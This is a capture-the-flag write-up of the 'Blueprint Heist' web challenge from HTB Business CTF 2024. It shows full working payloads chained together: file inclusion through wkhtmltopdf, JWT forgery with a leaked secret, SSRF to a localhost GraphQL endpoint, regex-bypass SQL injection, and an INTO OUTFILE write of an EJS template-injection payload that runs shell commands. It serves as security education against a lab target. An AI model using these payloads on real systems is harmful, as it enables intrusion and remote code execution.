---
layout: post
title: HTB Business CTF 2024 - Blueprint Heist 
description: Hack the Box's Business CTF 2024 came to a close this week and had its share of fun flags to capture. This writeup will be focussing on 'Blueprint Heist' - a web challenge which required the chaining of multiple exploits.
image: https://media.licdn.com/dms/image/D4E10AQFXxbuyydr5CQ/image-shrink_800/0/1713182884784/BIZCTF24_KV_1920x1080jpg?e=2147483647&v=beta&t=HglVJKeH4BHSZnP5RF9Xri4_F62pcp_ISSFuGf_8bBo
categories: [CTF]
---

# The Challenge
**Name:** Blueprint Heist

**Category:** Web

**Points:** 350

**Requirements:** Node.js, [Burp Suite](https://portswigger.net/burp)

## Setup

This challenge included a website that could be could spun up, as well as a `.zip` file containing the application code allowing us to perform white box testing. After spawning the Docker container, the home page could be visited - a simple website which allows users to view construction reports: 

![image](../images/htb-ctf-2024/website-index.png)
*Website index*

Since we were given the application code, I skipped the usual enumeration steps and jumped straight into analysing and taking notes of the application's functionality.

After unzipping the file, there was a standard web application directory setup:

![image](../images/htb-ctf-2024/root-directory.png)
*Code / directory*

Opening `Dockerfile`, there was nothing out of the ordinary. We can see that a binary called `/readflag` is copied and built inside the server's root directory which'll enable us to read the flag at the end of the challenge (likely via an RCE exploit):

```Dockerfile
COPY config/readflag.c /
RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c
```
{: file='Dockerfile'}

There's also various mentions of `node`, so we can guess we're dealing with a Node.js server. `build-docker.sh` also let us know that the application is running on port `1337`: 

```s
docker run -p 1337:1337 -it --rm --name=blueprint-heist blueprint-heist
```
{: file='build-docker.sh'}

Nothing of interest was found in the other files/folders apart from `/app` - the directory containing the web application itself.

## Code Analysis

There's a fair amount to digest here, but it's also where the fun starts. Firstly, let's look at `app/.env` to see what configuration variables and secrets are being set:

```js
DB_HOST=127.0.0.1
DB_USER=root
DB_PASSWORD=D4T4b4s3Secr3tP4ssw0rd1ss0L0ngOmG!
DB_NAME=construction
DB_PORT=3306
secret=IM_Sup3r_K3y_pl3ase_b3_c4r3ful?
```
{: file='app/.env'}

We've got various variables for MySQL, which tells us there's a database running on the server, as well as a dummy generic secret. It's worth noting that these are *not* the actual secret values - they are different on the live website. 

Next, let's check out what routes there are in `app/routes`. We've got two files - `public.ejs` and `internal.ejs`. 

```js
const express = require("express");
const router = express.Router();

const { authMiddleware, generateGuestToken } = require("../controllers/authController")
const { convertPdf } = require("../controllers/downloadController")

router.get("/", (req, res) => {
    res.render("index");
})

router.get("/report/progress", (req, res) => {
    res.render("reports/progress-report")
})

router.get("/report/enviromental-impact", (req, res) => {
    res.render("reports/enviromental-report")
})

router.get("/getToken", (req, res, next) => {
    generateGuestToken(req, res, next)
});

router.post("/download", authMiddleware("guest"), (req, res, next) => {
    convertPdf(req, res, next)
})

module.exports = router;
```
{: file='app/routes/public.ejs'}


Starting with `public.ejs`, we can see the `/` route we visited earlier, as well as the two report pages. We've also got an endpoint at `/getToken` we can request to call `generateGuestToken()` and an authenticated `/download` endpoint which guest users can request to call `convertPdf()`. We'll investigate these later.

```js
const express = require("express");
const router = express.Router();

const { authMiddleware } = require("../controllers/authController")

const schema = require("../schemas/schema");
const pool = require("../utils/database")
const { createHandler } = require("graphql-http/lib/use/express");


router.get("/admin", authMiddleware("admin"), (req, res) => {
    res.render("admin")
})

router.all("/graphql", authMiddleware("admin"), (req, res, next) => {
    createHandler({ schema, context: { pool } })(req, res, next); 
});

module.exports = router;
```
{: file='app/routes/internal.ejs'}

`private.ejs` reveals two more authenticated endpoints, this time for admin users only. The corresponding view for `/admin` in `app/views/admin.ejs` didn't contain much, however `app/schemas/schema.js` used by `/graphql` has some interesting functionality. 

If you're unfamiliar with GraphQL, the TL;DR is that it's just another way to query and build APIs - functionally similar to REST.

```js
...
    getDataByName: {
      type: new GraphQLList(UserType),
      args: {
        name: { type: GraphQLString }
      },
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        console.log(args.name)
        if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows => rows[0]);
        } catch (error) {
            return generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    }
...
```
{: file='app/schemas/schema.js'}

There were two different types of queries supported by this schema, both which used SQL queries to fetch data. `getDataByName` was the most interesting of the two as it used a pattern which is commonly associated with SQL injection: string substitution.  

```
`SELECT * FROM users WHERE name like '%${args.name}%'`
```

Given the user controls `{args.name}` when querying the endpoint, there's potential to leak additional information from the database if the correct payload is crafted. We'll shelve this idea for now as we don't have access to the endpoint, but we'll investigate further when we're authenticated as an admin. 

## Guest Authentication 

Stepping back, it's time we look at getting authenticated as a guest so we can use the `/download` endpoint which'll allow us to ~~abuse~~ use the `convertPdf()` function we saw earlier. Let's check out `app/controllers/authController.js`:

```js
const secret = process.env.secret

const authMiddleware = (requiredRole) => {
    return (req, res, next) => {
        const token = req.query.token;
        ...
        const role = verifyToken(token);
        ...
}

function generateGuestToken(req, res, next) {
    const payload = {
        role: 'user'
    };

    jwt.sign(payload, secret, (err, token) => {
        if (err) {
            next(generateError(500, "Failed to generate token."));;
        } else {
            res.send(token);
        }
    });
}
...
```
{: file='app/controllers/authController.js'}

There's a couple of functions within this file. Focussing on `generateGuestToken()` first, we can see it generates and signs a JWT using the secret from the `app/.env` file. Let's test this functionality by `curl`'ing `/getToken`:

![image](../images/htb-ctf-2024/curl-guest-token.png)
*curl'ing a guest JWT*

Success! We've now got a JWT we can use to authenticate ourselves as a guest. We can see in `authController.js` that this token should be added as a query parameter to any authenticated request we want to make. 

It's worth noting this token only has `role: 'user'` assigned, so we won't be able to request any routes defined in `app/routes/internal.ejs` just yet.

## Local File Inclusion (LFI)

It's time to do some testing on the authenticated `/download` endpoint from earlier. Let's look at what the `convertPdf()` function does in `/app/controllers/downloadController.js`:

```js
const wkhtmltopdf = require('wkhtmltopdf');

async function convertPdf(req, res, next) {
    try {
        const { url } = req.body;

        if (!isUrl(url)) {
            return next(generateError(400, "Invalid URL"));
        }

        const pdfPath = await generatePdf(url);
        res.sendFile(pdfPath, {root: "."});

    } catch (error) {
        return next(generateError(500, error.message));
    }
}
...
```
{: file='app/controllers/downloadController.js'}

The above tells us that `/download` requires a `url` parameter as part of the body before calling `generatePdf()` which converts the supplied URL's HTML to PDF using `wkhtmltopdf`. 

Using Burp Suite, we'll intercept a request to `/download`, right click > `Send to repeater`, switch the request to POST, attatch the token as a query parameter, add `Content-Type: application/json` as a header and include a `url` parameter in the body. 

![image](../images/htb-ctf-2024/download-pdf-request.png)
*Authenticated guest request to /download*

Sure enough, after hitting send and viewing the response in our browser we've got a PDF of `http://google.com`:

![image](../images/htb-ctf-2024/google-pdf.png)
*Converted http://google.com to PDF*

Next, let's see what we can do to exploit it. We know that `wkhtmltopdf` is being used to convert HTML to PDF, so after some research I came across the following [exploit](https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/).

It looks like LFI might be possible here if we're able to construct the correct payload. Looking again at `app/controllers/downloadController.js` for hints, we can see there's validation on the URL we supply via `isUrl()`:

```js
const { isUrl } = require("../utils/security")
...
if (!isUrl(url)) {
    return next(generateError(400, "Invalid URL"));
}
...
```
{: file='app/controllers/downloadController.js'}

Looking at `/app/utils/security.js`, we can see the function doesn't really do much apart from validate that the URL is standard format:

```js
...
function isUrl(url) {
    try {
      new URL(url);
      return true;
    } catch (err) {
      return false;
    }
  };
```
{: file='app/utils/security.js'}

After some testing, we were able to render anything we wanted through supplying `localhost:1337/<HTML>` as `url`:

> `localhost` is the server's loopback address and `1337` is the port we saw the app running on in `build-docker.sh`.
{: .prompt-info }

![image](../images/htb-ctf-2024/html-excellent.png)
*User supplied HTML being converted to PDF*

It's worth noting that `0.0.0.0:1337` and `127.0.0.1:1337` were also tested, but returned `Invalid URL` errors.

Now that we're able to render any HTML we supply, let's try dump the contents of `/app/.env` which contains the secret we need to create an admin JWT. We'll use `<script>` tags to create an `XMLHttpRequest` object that requests the contents of `file:///app.env` from the server.


```json
{
    "url" :"localhost:1337/<script>x=new XMLHttpRequest;x.onload=function()document.write(this.responseText)};x.open('GET','file:///app.env');x.send();</script>"
}
```

![image](../images/htb-ctf-2024/app-env-dump.png)
*Contents of /app/.env via LFI*

That worked! We've now got the secret that's used to sign JWTs:

```
Str0ng_K3y_N0_L3ak_pl3ase
```

Supplying `file:///root/flag.txt` was also attempted, however the `node` user executing these commands on the server did not have appropriate permissions and resulted in `ContentNotFound` errors. 

## JWT Forgery

Now that we've leaked the secret used to sign JWTs, we should be able to create one with the payload of `role: 'admin'` instead of `role: 'user'` to access the internal `/graphql` endpoint. Let's create a script to do just that:

```js
const jwt = require('jsonwebtoken');
const currentTime = Math.floor(Date.now() / 1000);
const secret = 'Str0ng_K3y_N0_l3ak_pl3ase?';

const payload = {
    role: 'admin',
    iat: currentTime
};

const token = jwt.sign(payload, secret, { algorithm: 'HS256' });

console.log(token);
```

![image](../images/htb-ctf-2024/admin-jwt.png)
*Admin JWT creation*

Admin token in hand, we should now be able to authenticate to the routes in `app/routes/internal.ejs`.

## Server-Side Request Forgery (SSRF)

Remember the `getDataByName` query accessible via `/graphql` from earlier? We should now be able to access it. Let's see if we can query it via the browser with our new admin JWT as the `token` query parameter:

![image](../images/htb-ctf-2024/internal-users-only.png)
*Internal users only error on /graphql endpoint*

Looks like only internal users are able to access the endpoint...even with an admin token 🤔 Let's look at the code of `app/controllers/authController.js` again to see how it checks for this:

```js
const { checkInternal } = require("../utils/security")
...
const authMiddleware = (requiredRole) => {
    return (req, res, next) => {
        const token = req.query.token;

        if (!token) {
            return next(generateError(401, "Access denied. Token is required."));
        }

        const role = verifyToken(token);

        if (!role) {
            return next(generateError(401, "Invalid or expired token."));
        }

        if (requiredRole === "admin" && role !== "admin") {
            return next(generateError(401, "Unauthorized."));
        } else if (requiredRole === "admin" && role === "admin") {
            if (!checkInternal(req)) {
                return next(generateError(403, "Only available for internal users!"));
            }
        }

        next();
    };
};
...
```
{: file='app/controllers/authController.js'}

`checkInternal()` looks like the culprit in `app/utils/security.js`:

```js
function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '')
    return address === "127.0.0.1"
}
```
{: file='app/utils/security.js'}

We now know that the request must come from `127.0.0.1` to be authorised for `/graphql`. Luckily, that's exactly what our previous LFI exploit was doing. Let's create a new payload to request `getDataByName` from `/graphql` *from* the `/download` endpoint. 

Firstly, we need to format our GraphQL query as per the schema in `app/schemas/schema.js`. If you recall from earlier, we can supply `name` as an argument to be passed into the SQL query. 

> GraphQL queries are formatted differently to regular REST API queries. [Learn more](https://graphql.org/learn/queries/).
{: .prompt-tip }

```
query={
    getDataByName(name: "john") {
        id
        name
    }
}
```

`id` is a value that is part of the `User` model under `app/models/users.js`. We include this in the GraphQL query so that any user `LIKE` the name `john` has their `id` (and `name`) returned.

```js
...
const UserType = new GraphQLObjectType({
    name: 'User',
    fields: () => ({
      id: { type: GraphQLID },
      name: { type: GraphQLString },
      department: { type: GraphQLString },
      isPresent: { type: GraphQLBoolean }
    })
  });
...
```
{: file='app/models/users.js'}

We'll also URL encode our GraphQL query so it can be passed in via the `query` parameter in the URL:

```
query=%7B%0A%20%20getDataByName(name%3A%20%22john%22)%20%7B%0A%20%20%20%20id%0A%20%20%20%20name%0A%20%20%7D%0A%7D
```

> I ended up having to change the payload here to use an `<iframe>`, rather than a `XMLHttpRequest` object, as requests to `/graphql` weren't displaying properly.
{: .prompt-info }

This makes our final query look like:

```json
{
    "url" :"localhost:1337/<iframe src='http://localhost:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYxOTM0ODZ9.CwFQM5tcCFDeRt45Sa7ExJkndNfSp_kF9QhvyXu151Y&query=%7B%0A%20%20getDataByName(name%3A%20%22john%22)%20%7B%0A%20%20%20%20id%0A%20%20%20%20name%0A%20%20%7D%0A%7D' height='1000' width='1000'></iframe>"
}
```

![image](../images/htb-ctf-2024/graphql-query.png)
*Successful GraphQL query*

Success! We're now able to query `/graphql` as an internal user from `127.0.0.1` using our admin JWT.

## SQL Injection

Since `name` is being passed into the GraphQL schema before being insecurely substituted into the SQL query, we can likely perform SQL injection on the database. Let's have another look at the query in `app/schemas/schema.js`:

```js  
...
const { detectSqli } = require("../utils/security")
...
        if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows => rows[0]);
...
```
{: file='app/schemas/schema.js'}

We can see that there's been attempt to stop SQL injection via `detectSqli()`. Let's check the function out in `app/utils/security.js`:

```js
function detectSqli (query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
    return pattern.test(query)
}
```
{: file='app/utils/security.js'}

We've got a RegEx check which tests for symbols such as `'` and `"` - both of which are extremely useful when it comes to performing SQL injection. Let's look for a bypass. 

After a bit of research, I came across the following ReGex [cheat sheet](https://github.com/attackercan/regexp-security-cheatsheet). It mentions that a RegEx check can be potentially bypassed with a newline character (`\n`) if the dot symbol is used in the pattern.

>In case modifier /m is not (globally) specified, regexp should avoid using dot . symbol, which means every symbol except newline (\n). It is possible to bypass regex using newline injection.


Perfect. 

It took a couple of attempts to craft the correct payload, but eventually we were able to do the following through escaping `\n`:

> `'OR 1=1--` is a classic test for SQL injection - it's a query that always returns true. If successful it'll dump all rows from the queried table. 
{: .prompt-tip }


```
query={
  getDataByName(name: "john\\n' OR 1=1-- ") {
    id
    name
  }
}
```

```json
{
    "url" :"localhost:1337/<iframe src='http://localhost:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYxOTM0ODZ9.CwFQM5tcCFDeRt45Sa7ExJkndNfSp_kF9QhvyXu151Y&query=%7B%0A%20%20getDataByName(name%3A%20%22john\\n%27%20OR%201=1--%20%22)%20%7B%0A%20%20%20%20id%0A%20%20%20%20name%0A%20%20%7D%0A%7D' height='1000' width='1000'></iframe>"
}

```

![image](../images/htb-ctf-2024/sql-injection-1=1.png)
*SQL injection success*

Success! Since we're now able to perform SQL injection to dump all rows in the table, we can also dump all table names in the database using a `UNION SELECT` statement after correctly guessing the amount of rows in the current table:

```
{
  getDataByName(name:"john\\n'UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables;-- ") {
    id
    name
  }
}
```

```json

{
    "url" :"localhost:1337/<iframe src='http://localhost:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYyMTE4NDd9.Pk8ZBsRnCz82MIJhLuAfWJ6H0k4x2DaVlvY18dkCxYc&query=%7B%0A%20%20getDataByName(name%3A%22john\\n%27UNION%20SELECT%20table_name%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.tables%3B--%20%22)%20%7B%0A%20%20%20%20id%0A%20%20%20%20name%0A%20%20%7D%0A%7D' height='2000' width='1000'></iframe>"
}
```

![image](../images/htb-ctf-2024/sql-table-dump.png)
*SQL table name dump*

There was nothing immediately useful here, so I shifted my efforts toward gaining RCE on the server to call `/readflag` and finish the challenge.

## Server-Side Template Injection (SSTI) & Remote Code Execution (RCE)

Final stretch - finding a way to get RCE on the server, presumebly via SQL injection. After doing some research, I came across [SSTI in EJS](https://eslam.io/posts/ejs-server-side-template-injection-rce/) - the templating engine used by the web application.

It looks like if we can write a file to the server, we could call `/readflag` using the following:

```js
<%= global.process.mainModule.require(`child_process`).execSync(`/readflag`).toString() %>
```

but how? We need to solve two problems:

1) Writing files to the server
2) Triggering the rendering of our EJS payload 

### Writing files via SQL injection

After researching and experimenting with payloads, I came across the following MariaDB expression: [INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/). This allows a query to write its result to a file:

```
query={
  getDataByName(name:"john\\n'UNION SELECT 1,1,1, '<%= global.process.mainModule.require(`child_process`).execSync(`/readflag`).toString() %>' INTO OUTFILE '/app/views/test.ejs'-- ") {
    id
    name
  }
}
```

```json
{
    "url" :"localhost:1337/<iframe src='http://localhost:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYyMTE4NDd9.Pk8ZBsRnCz82MIJhLuAfWJ6H0k4x2DaVlvY18dkCxYc&query=%7B%0A%20%20getDataByName(name%3A%22john%5C%5Cn%27UNION%20SELECT%201%2C1%2C1%2C%20%27%3C%25%3D%20global.process.mainModule.require(%60child_process%60).execSync(%60%2Freadflag%60).toString()%20%25%3E%27%20INTO%20OUTFILE%20%27%2Fapp%2Fviews%2Ftest.ejs%27--%20%22)%20%7B%0A%20%20%20%20id%0A%20%20%20%20name%0A%20%20%7D%0A%7D' height='2000' width='1000'></iframe>"
}
```

![image](../images/htb-ctf-2024/file-write.png)
*SQL file write*

It didn't immediately look good, but after verifying the file was uploaded to `app/views/test.ejs` using our old payload to view `file:///app/views/test.ejs` we can see it worked! 

![image](../images/htb-ctf-2024/file-write-result.png)
*SQL file write result*

Now we face the problem of actually getting the payload to execute and render in the context of EJS.

### Rendering payload with error EJS template

Finding a directory where our EJS payload could be served up and rendered wasn't too difficult. A simple `grep -r find "render"` shows all calls to `res.render()`:

![image](../images/htb-ctf-2024/grep-results.png)
*grep -r find "render" . results*

One file from the above we haven't looked at yet is `app/controllers/errorController.js`:

```js
...
const renderError = (err, req, res) => {
    res.status(err.status);
    const templateDir = __dirname + '/../views/errors';
    const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"
    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);

    if (!fs.existsSync(templatePath)) {
        templatePath = path.join(templateDir, `error.ejs`);
    }
    console.log(templatePath)
    res.render(templatePath, { error: err.message }, (renderErr, html) => {
        res.send(html);
    });
};
```
{: file='app/controllers/errorController.js'}

This looks promising. The function is dynamically fetching error templates that match the raised status code, e.g. if a `400` error occurs, `app/views/errors/400.ejs` will be rendered in the browser via `res.render()`. 

Looking at the existing error message templates shows the following: 

![image](../images/htb-ctf-2024/error-files.png)
*Existing error EJS templates*

There are templates for `400.ejs`, `401.ejs` and `500.ejs` - but no `404.ejs` (404 Not Found) template. 404 errors are easy enough to trigger in browser, so let's attempt to write a file again using our SQL injection payload - this time to `app/views/errors/404.ejs`.

```json
{
    "url" :"localhost:1337/<iframe src='http://localhost:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTYyMTE4NDd9.Pk8ZBsRnCz82MIJhLuAfWJ6H0k4x2DaVlvY18dkCxYc&query=%7B%0A%20%20getDataByName(name%3A%22john%5C%5Cn%27UNION%20SELECT%201%2C1%2C1%2C%20%27%3C%25%3D%20global.process.mainModule.require(%60child_process%60).execSync(%60%2Freadflag%60).toString()%20%25%3E%27%20INTO%20OUTFILE%20%27%2Fapp%2Fviews%2Ferrors%2F404.ejs%27--%20%22)%20%7B%0A%20%20%20%20id%0A%20%20%20%20name%0A%20%20%7D%0A%7D' height='2000' width='1000'></iframe>"
}
```

Next, we visit a non-existant route (e.g. `/blah`) to trigger a 404 error:

![image](../images/htb-ctf-2024/flag.png)
*/readflag executed and flag rendered*

Flag retrieved! and challenge completed...many chained exploits later.

```
HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_ccea0026c9303ec1278b9c8288778c6d}
```

## What did I learn?

1) Exploit chaining is fun, and enabled by multiple minor security misconfigurations.

2) Frankenstein URL encoded exploits are a pain to look at. 
